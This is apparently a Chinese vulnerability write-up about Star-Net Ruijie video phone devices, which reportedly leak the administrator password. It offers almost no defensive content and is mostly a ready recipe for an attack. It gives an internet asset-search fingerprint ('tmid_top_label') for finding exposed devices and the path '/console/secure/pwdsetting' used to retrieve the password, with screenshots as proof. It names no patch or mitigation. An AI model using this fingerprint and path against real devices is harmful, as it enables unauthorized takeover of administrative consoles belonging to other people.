# 星网锐捷视频话机设备pwdsetting管理密码泄漏

**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">星网锐捷视频话机设备  泄露管理员密码，攻击者可利用密码直接进入后台配置页面，执行恶意操作，为进一步攻击提供帮助。</font>  
**二、影响版本**

星网锐捷视频话机设备

**三、资产测绘**

```plain
body="tmid_top_label"
```

●登录页![1711938753201-a499e700-224a-4dd8-bf3b-ea7d54ed1574.png](./img/DzvaFQV7DsT5tO_q/1711938753201-a499e700-224a-4dd8-bf3b-ea7d54ed1574-768831.png)

**四、漏洞复现**

```plain
/console/secure/pwdsetting
```

![1711938770662-d997d58a-e99d-4997-8e3a-2ff9d2977ab8.png](./img/DzvaFQV7DsT5tO_q/1711938770662-d997d58a-e99d-4997-8e3a-2ff9d2977ab8-412419.png)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cmom2yrgpqpou44c>